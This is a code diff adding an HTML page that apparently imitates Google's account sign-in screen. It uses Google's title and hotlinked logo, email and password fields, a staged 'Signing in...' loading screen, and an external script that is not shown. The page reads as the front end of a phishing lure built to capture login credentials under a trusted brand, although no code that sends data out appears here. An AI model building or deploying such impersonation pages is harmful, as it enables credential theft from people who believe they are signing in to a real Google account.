@@ -1,0 +1,29 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google accounts</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo">
+    <h2>Sign in</h2>
+    <p>to continue to Google</p>
+    <form id="loginForm">
+      <input type="email" placeholder="Email or phone" required/>
+      <input type="password" placeholder="Enter your password" required/>
+      <button type="submit">Next</button>
+    </form>
+    <p class="footer-text">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+  </div>
+
+  <div id="loadingScreen" class="hidden">
+    <p>Signing in...</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
